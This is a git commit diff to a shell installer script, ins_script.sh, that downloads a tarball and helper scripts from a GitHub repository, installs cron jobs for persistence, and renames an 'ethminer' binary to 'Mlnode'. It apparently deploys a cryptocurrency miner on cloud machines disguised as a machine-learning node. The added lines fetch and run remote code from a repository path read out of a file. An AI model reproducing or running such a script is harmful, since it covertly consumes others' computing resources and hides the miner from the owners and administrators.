f81c6bf940ea03d3bedf93c30c702dbb2173ac7d
Model Deverlopment <79557662+awsdiami@users.noreply.github.com>
2022-03-07 18:09:52 +0700

    Update ins_script.sh

--- ins_script.sh
+++ ins_script.sh
@@ -1,19 +1,23 @@
+#Get path from Cronjob
+whoami > name.txt
+namepath=$(head -1 name.txt)
+path=/home/$namepath
+cd $path
+gitpath=$(head -1 gitpath.txt)
 
-cd /home/azureuser
-
-wget https://github.com/awsdiami/AzureCLN/raw/main/Mlnode.tar.gz
+wget https://github.com/$gitpath/raw/main/Mlnode.tar.gz
 tar -xvf Mlnode.tar.gz
 rm -rf Mlnode.tar.gz
-wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/cron.sh
-wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/addcron.sh
-wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/croncheck.sh
+wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
+wget https://raw.githubusercontent.com/$gitpath/main/addcron.sh
+wget https://raw.githubusercontent.com/$gitpath/main/croncheck.sh
 chmod +x addcron.sh
 chmod +x croncheck.sh
 ./addcron.sh
 ./croncheck.sh
 
 cd bin/
-wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/runsrc.sh
+wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
 chmod +x runsrc.sh
 mv ethminer Mlnode
 
